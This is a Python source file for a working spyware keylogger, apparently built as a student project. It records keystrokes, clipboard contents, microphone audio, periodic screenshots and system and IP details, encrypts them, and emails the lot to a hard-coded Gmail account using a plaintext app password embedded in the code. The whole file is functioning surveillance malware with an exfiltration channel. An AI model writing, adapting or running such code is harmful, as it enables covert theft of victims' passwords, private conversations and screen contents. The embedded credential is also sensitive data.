# Import Libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import win32clipboard
from scipy.io.wavfile import write
import sounddevice as sd
from PIL import ImageGrab
from requests import get
import time
import os
from threading import Thread, Event
from pynput import keyboard
from cryptography.fernet import Fernet

# File Names and Directories
keys_information = "keystrokesFile.txt"
system_information = "system_information.txt"
clipboard_information = "clipboard.txt"
audio_information = "microphoneAudio.wav"
screenshot_information_prefix = "screenshot"
file_path = "C:/Users/HP/PycharmProjects/ETHProject"
extend = "\\"

# Email Configuration
email_address = "klogger235@gmail.com"
password = "atkb kyfd lazr waqu"
toaddr = "klogger235@gmail.com"

# Stop event to terminate threads
stop_event = Event()

# Ensure the directory exists
if not os.path.exists(file_path):
    os.makedirs(file_path)

# Key for encryption
key_file_path = os.path.join(file_path, "encryption_key.key")
if not os.path.exists(key_file_path):
    key = Fernet.generate_key()
    with open(key_file_path, "wb") as key_file:
        key_file.write(key)
else:
    with open(key_file_path, "rb") as key_file:
        key = key_file.read()

cipher_suite = Fernet(key)

# Function to encrypt files
def encrypt_file(filepath):
    try:
        with open(filepath, 'rb') as file:
            data = file.read()
        encrypted_data = cipher_suite.encrypt(data)
        encrypted_filepath = filepath + ".enc"
        with open(encrypted_filepath, 'wb') as encrypted_file:
            encrypted_file.write(encrypted_data)

        # Delete the original file after successful encryption
        os.remove(filepath)
        return encrypted_filepath
    except Exception as e:
        print(f"Encryption failed for {filepath}: {e}")
        return None

# Function to send all data as a single email
def send_all_data():
    try:
        fromaddr = email_address
        msg = MIMEMultipart()
        msg['From'] = fromaddr
        msg['To'] = toaddr
        msg['Subject'] = "All Logs"
        body = "Attached are all the captured logs and data."
        msg.attach(MIMEText(body, 'plain'))

        # Attach all encrypted files
        encrypted_files = [
            f for f in os.listdir(file_path)
            if f.endswith(".enc")
        ]

        for encrypted_file in encrypted_files:
            filepath = os.path.join(file_path, encrypted_file)
            with open(filepath, 'rb') as attachment:
                p = MIMEBase('application', 'octet-stream')
                p.set_payload(attachment.read())
                encoders.encode_base64(p)
                p.add_header('Content-Disposition', f"attachment; filename={os.path.basename(filepath)}")
                msg.attach(p)

        # Email setup and send
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(fromaddr, password)
        server.sendmail(fromaddr, toaddr, msg.as_string())
        server.quit()
        print("All data sent successfully.")
    except Exception as e:
        print(f"Failed to send all data: {e}")

# Capture system information
def capture_system_information():
    filepath = file_path + extend + system_information
    with open(filepath, "w") as f:
        try:
            hostname = socket.gethostname()
            IPAddr = socket.gethostbyname(hostname)
            public_IPAddr = get("https://api.ipify.org").text
            f.write(f"Public IP Address: {public_IPAddr}\n")
        except Exception:
            f.write("Couldn't get Public IP Address\n")
        f.write(f"Processor: {platform.processor()}\n")
        f.write(f"System: {platform.system()} {platform.version()}\n")
        f.write(f"Machine: {platform.machine()}\n")
        f.write(f"Hostname: {hostname}\n")
        f.write(f"Private IP Address: {IPAddr}\n")
    encrypt_file(filepath)
    print("System information captured and encrypted")

# Capture clipboard data
def capture_clipboard():
    filepath = file_path + extend + clipboard_information
    with open(filepath, "w") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data:\n" + pasted_data)
        except:
            f.write("Clipboard could not be copied")
    encrypt_file(filepath)
    print("Clipboard data captured and encrypted")

# Record microphone audio
def record_microphone_audio():
    filepath = file_path + extend + audio_information
    try:
        fs = 44100
        seconds = 10
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=1)
        sd.wait()
        write(filepath, fs, myrecording)
        encrypt_file(filepath)
        print("Audio recorded and encrypted")
    except Exception as e:
        print(f"Audio recording failed: {e}")

# Take screenshots
def take_screenshot():
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    filepath = f"{file_path}{extend}{screenshot_information_prefix}_{timestamp}.png"
    img = ImageGrab.grab()
    img.save(filepath)
    encrypt_file(filepath)
    print(f"Screenshot captured and encrypted: {filepath}")

# Keylogger function using pynput
def record_keys():
    filepath = file_path + extend + keys_information

    def on_press(key):
        with open(filepath, "a") as f:
            try:
                if hasattr(key, 'char') and key.char is not None:
                    f.write(f"{key.char}\n")
                else:
                    f.write(f"[{key}]\n")
                f.flush()
            except Exception as e:
                print(f"Error logging key: {e}")

    def on_release(key):
        if key == keyboard.Key.esc:
            stop_event.set()
            print("ESC pressed. Stopping keylogger.")
            return False

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    encrypt_file(filepath)
    print("Keylogger stopped and keystroke file encrypted.")

# Main execution
if __name__ == "__main__":
    try:
        # Step 1: Capture system information, clipboard, and audio
        capture_system_information()
        capture_clipboard()
        record_microphone_audio()

        # Step 2: Run the keylogger in a separate thread
        keylogger_thread = Thread(target=record_keys, daemon=True)
        keylogger_thread.start()

        # Step 3: Capture screenshots at intervals
        while not stop_event.is_set():
            take_screenshot()
            time.sleep(10)

        # Step 4: Once keylogging stops (ESC key), send all data
        keylogger_thread.join()

    except KeyboardInterrupt:
        print("KeyboardInterrupt detected. Stopping program.")
        stop_event.set()

    # Send all data after collecting logs and data
    send_all_data()
    print("Program completed.")
